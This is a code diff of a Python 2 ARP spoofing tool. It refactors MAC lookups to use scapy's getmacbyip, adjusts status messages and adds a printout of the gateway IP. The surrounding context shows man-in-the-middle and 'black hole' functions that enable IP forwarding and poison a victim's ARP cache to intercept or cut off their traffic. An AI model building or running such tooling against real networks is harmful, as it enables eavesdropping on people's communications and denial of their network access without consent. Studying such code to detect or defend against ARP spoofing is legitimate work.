@@ -53,7 +53,7 @@ def man_in_the_middle(sniffing_mode_choice):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     print "[Info.] Start to spoof gateway and victim...[Ctrl+C to stop]"
 
-    gateway_MAC = get_MAC(gateway_IP)
+    gateway_MAC = getmacbyip(gateway_IP)
     if gateway_MAC is None:
         print "[Error] Failed to get gateway MAC."
         print "[Info.] Now exiting."
@@ -61,7 +61,7 @@ def man_in_the_middle(sniffing_mode_choice):
     else:
         print "[Info.] Gateway %s's MAC: %s" % (gateway_IP, gateway_MAC)
 
-    victim_MAC = get_MAC(victim_IP)
+    victim_MAC = getmacbyip(victim_IP)
     if victim_MAC is None:
         print "[Error] Failed to get victim MAC."
         print "[Info.] Now exiting."
@@ -196,7 +196,7 @@ def sniff_network(function_name, victim_IP):
 def black_hole():
     print "[Info.] Start to poison the victim...[Ctrl+C to stop]"
 
-    victim_MAC = get_MAC(victim_IP)
+    victim_MAC = getmacbyip(victim_IP)
     if victim_MAC is None:
         print "[Error] Failed to get victim MAC."
         print "[Info.] Now exiting."
@@ -223,7 +223,7 @@ def spoof_black_hole(gateway_IP, victim_IP, victim_MAC):
 
 
 def restore_black_hole(gateway_IP, victim_IP, victim_MAC):
-    gateway_MAC = get_MAC(gateway_IP)
+    gateway_MAC = getmacbyip(gateway_IP)
     print "[Info.] Start to recover the LAN."
     print "[Info.] Please wait for a while."
     print "[Info.] Sending real ARP replies to victim..."
@@ -231,14 +231,9 @@ def restore_black_hole(gateway_IP, victim_IP, victim_MAC):
     time.sleep(3)
     print "[Info.] The LAN has been recovered."
 
-
-def get_MAC(IP):
-    responses, noresponse = srp(Ether(dst=broadcast_mac) / ARP(pdst=IP), timeout=2, retry=3)
-    for s, r in responses:
-        return r[Ether].src
-
 if __name__ == "__main__":
-    print "[Info.] ARP Spoofing tool is starting up...\n[Info.] Scanning network interfaces..."
+    print "[Info.] ARP Spoofing tool is starting up..."
+    print "[Info.] Scanning network interfaces..."
     available_interfaces = netifaces.interfaces()
     print "[Info.] Available network interface list:"
     interface_count = 0
@@ -253,8 +248,9 @@ if __name__ == "__main__":
             break
         print "[Info.] Invalid network interface, please select again."
 
+    print "[Info.] Gateway IP:%s" % conf.route.route('0.0.0.0')[2]
     interface_network_config = netifaces.ifaddresses(interface_name)[netifaces.AF_INET]
-    print "[Info.] Network config: %s" % interface_network_config
+    print "[Info.] Network info: %s" % interface_network_config
     interface_mac = netifaces.ifaddresses(interface_name)[netifaces.AF_LINK]
     print "[Info.] MAC info: %s" % (interface_mac)
     attacker_mac = interface_mac[0]["addr"]
